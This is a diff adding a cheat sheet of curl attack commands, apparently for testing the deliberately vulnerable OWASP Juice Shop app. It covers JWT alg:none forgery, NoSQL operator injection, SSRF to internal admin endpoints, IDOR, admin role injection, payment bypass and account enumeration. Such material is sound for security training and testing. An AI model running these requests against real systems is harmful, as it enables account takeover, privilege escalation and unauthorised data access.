@@ -47,6 +47,79 @@ curl -X POST "<TARGET_URL>/rest/user/login" -H "Content-Type: application/json" 
 
 # Authenticated request
 curl -H "Authorization: Bearer <TOKEN>" "<TARGET_URL>/rest/user/whoami"
+
+# --- JWT Forgery ---
+# Fetch the leaked JWT public key
+curl -s "<TARGET_URL>/encryptionkeys/jwt.pub" -o jwt.pub
+
+# Decode a JWT token (base64url decode header + payload)
+echo "<TOKEN>" | cut -d. -f1 | base64 -d 2>/dev/null
+echo "<TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null
+
+# Create a JWT with alg:none bypass
+# Header: {"typ":"JWT","alg":"none"} → base64url: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
+# Payload: modify as needed, then base64url encode
+# Token: <header>.<payload>.  (empty signature with trailing dot)
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.<PAYLOAD_B64>." "<TARGET_URL>/rest/user/whoami"
+
+# --- NoSQL Injection ---
+# MongoDB operator injection on product reviews
+curl -X PATCH "<TARGET_URL>/rest/products/reviews" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"id":{"$ne":-1},"message":"patched"}'
+
+# NoSQL $where injection
+curl -X PATCH "<TARGET_URL>/rest/products/reviews" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"id":{"$where":"sleep(100)"},"message":"test"}'
+
+# --- SSRF Testing ---
+# Profile image upload via URL (basic)
+curl -X POST "<TARGET_URL>/profile/image/url" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration"}'
+
+# SSRF with HTTP method bypass (PUT instead of POST)
+curl -X PUT "<TARGET_URL>/profile/image/url" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"imageUrl":"http://localhost:3000/encryptionkeys/jwt.pub"}'
+
+# SSRF targeting internal services
+curl -X POST "<TARGET_URL>/profile/image/url" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"imageUrl":"http://localhost:3001/rest/admin/application-configuration"}'
+
+# --- IDOR / Authorization Bypass ---
+# Access another user's basket (IDOR)
+curl -H "Authorization: Bearer <TOKEN>" "<TARGET_URL>/rest/basket/2"
+
+# Access another user's profile (IDOR)
+curl -H "Authorization: Bearer <TOKEN>" "<TARGET_URL>/api/Users/1"
+
+# Admin role injection during registration
+curl -X POST "<TARGET_URL>/api/Users" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"evil@test.com","password":"test1234","role":"admin"}'
+
+# Deluxe membership payment bypass
+curl -X POST "<TARGET_URL>/rest/deluxe-membership" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"paymentMode":"none"}'
+
+# --- Brute Force / Auth Testing ---
+# Account enumeration via security question endpoint
+curl -s "<TARGET_URL>/rest/user/security-question?email=admin@juice-sh.op" | head -c 500
+curl -s "<TARGET_URL>/rest/user/security-question?email=nonexistent@test.com" | head -c 500
+
+# Password change without current password (CSRF-like)
+curl -X GET "<TARGET_URL>/rest/user/change-password?new=evil&repeat=evil" \
+  -H "Authorization: Bearer <TOKEN>"
 ```
 
 ### File System (source code analysis)
